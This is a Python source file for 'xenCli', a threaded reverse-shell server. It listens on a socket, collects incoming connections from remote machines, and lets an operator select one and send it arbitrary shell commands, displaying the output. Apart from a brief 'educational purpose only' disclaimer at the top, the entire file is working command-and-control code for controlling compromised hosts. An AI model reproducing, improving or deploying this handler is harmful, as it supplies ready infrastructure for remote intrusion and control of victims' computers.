#!/usr/bin/python
import threading
import socket
import time
import sys
import os


# This code is for educational purpose only !!!
# i am not responsible if you use this code for a malicious behavior.

class Connection:
    def __init__(self, connection, address):
        # Public attributes.
        self.connection = connection
        self.ip = address[0]
        self.port = address[1]

    def adr(self):
        return '| IP {0} | PORT {1}'.format(self.ip, self.port)

    def close(self):
        self.connection.close()

    def recv(self, buffer=20480):
        return self.connection.recv(buffer)

    def recv_str(self, buffer=20480):
        return str(self.recv(buffer), 'utf-8')

    def send(self, data):
        self.connection.send(data)

    def send_str(self, data):
        self.send(str.encode(data))


class Thread():
    def __init__(self, target):
        # Protected objects.
        self._thread = threading.Thread(target=target)

        # Protected attributes.
        self._stop = threading.Event()
        self._target = target

        # Public attributes.
        self.name = self._target.__name__

        # Methods init.
        self._thread.setDaemon(True)
        print(self.name, ': thread created')

    def start(self):
        print(self.name, ': thread started')
        self._thread.start()

    def stop(self):
        print(self.name, ': thread stoped')
        self._stop.set()


def clear():
    global connections

    for connx in connections:
        connx.close()

    del connections[:]


def controlle(connx):
    def help():
        return '\n'.join([
            '', '--CONTROLLE COMMANDS--',
            '  Connection info : ' + connx.adr(), '',
            ' /close : close the connection',
            ' /help : show this message',
            ' /stop : to end the connection', '',
        ])

    commands_client = send_command(connx, '//help')
    print(help(), '\n', commands_client, end='')

    while True:
        try:
            command = input()

            if command == '/close':
                print('Connection closed')
                connx.close()
                break

            elif command == '/help':
                cwd = send_command(connx, 'cd')
                print(help(), cwd, end='')

            elif command == '/stop':
                break

            elif len(command) > 0:
                response = send_command(connx, command)
                print(response, end='')

        except:
            print('Connection was lost')
            connx.close()
            break

    print('END CONNECTION')


def eof_handle():
    global running
    global thread_listen
    global thread_main

    while True:
        if not running:
            break

    thread_listen.stop()
    thread_main.stop()
    clear()
    sys.exit()


def init_socket():
    try:
        global sock
        global host
        global port

        sock = socket.socket()
        sock.bind((host, port))
        sock.listen(5)

        print('Socket bind to port:', port)

    except Exception as error:
        print('Socket init error:', error)


def listen():
    global auto
    global connections
    global sock

    clear()

    while True:
        if auto:
            update()

        try:
            c, a = sock.accept()
            c.setblocking(1)
            new_connection = Connection(c, a)
            connections.append(new_connection)
            print('\rConnection has been establish: ID', len(connections) - 1, new_connection.adr())

        except Exception as error:
            print('\rListen connection error:', error)
            time.sleep(2)


def get_connection(cid):
    global connections

    try:
        cid = int(cid)
        connx = connections[cid]
        return connx

    except Exception as error:
        print(cid, ': not a valid choice')


def revshell():
    global auto
    global connections
    global running
    global version

    def help():
        return '\n'.join([
            '', '--MENU COMMANDS--',
            '  Server version ' + str(version), '',
            ' auto : toggle auto update connections, auto: ' + ('True' if auto else 'False'),
            ' cache : same has \'update\' but without removing dead connection',
            ' clear : clean terminal',
            ' close : close all connections',
            ' connect <id>: connect to select connection',
            ' help : show this message',
            ' quit : quit programme',
            ' update : display all connection availables and remove dead connection', '',
        ])

    print(help(), '\n\033[31m  INFO: if you force quit \'ctrl + d/c\', wait ~ 5-30 seconds before restarting\033[0m\n')

    while True:
        command = input('xenCli')

        if len(command) > 0:
            com = command.split(' ')

            for i, v in enumerate(com):
                if len(v) is 0:
                    del com[i]

            if command == 'auto':
                auto = not auto
                print('auto set to', ('True' if auto else 'False'))

            elif command == 'clear':
                try:
                    os.system('clear')

                except:
                    os.system('cls')

            elif command == 'close':
                clear()

            elif com[0] == 'connect':
                if len(connections) > 0:
                    connx = get_connection(com[1])

                    if connx is not None:
                        controlle(connx)

                else:
                    print('NO CONNECTIONS AVAILABLES')

            elif command == 'help':
                print(help())

            elif command == 'quit':
                running = False

            elif command == 'update' or command == 'cache':
                update(True, (True if command == 'cache' else False))

            else:
                print(command, ': unknow command')


def send_command(connx, command):
    connx.send_str(command)
    return connx.recv_str()


def update(display=False, cache=False):
    global connections
    resulsts = '--CONNECTIONS--' if not cache else '--CONNECTIONS CACHE--'

    for i, connx in enumerate(connections):
        try:
            connx.send_str(' ')
            connx.recv()

        except:
            if not cache:
                del connections[i]

            continue

        resulsts += '\nID {0} {1}'.format(i, connx.adr())

    if display:
        print('\n', (resulsts if len(connections) > 0 else 'NO CONNECTIONS AVAILABLES'), '\n')


if __name__ == '__main__':
    global auto
    global connections
    global host
    global port
    global running
    global version

    global thread_listen
    global thread_main

    auto = True
    connections = []
    host = '127.0.0.1'
    port = 9999
    running = True
    version = 0.01

    init_socket()

    thread_eof = Thread(eof_handle)
    thread_listen = Thread(listen)
    thread_main = Thread(revshell)
    thread_eof.start()
    thread_listen.start()
    thread_main.start()

    while running:
        # If ctrl + c or ctrl + d event break the loop and continue the code.
        time.sleep(0.1)

    # If the loop is broken this line is executed and eof_handle stop the threads.
    running = False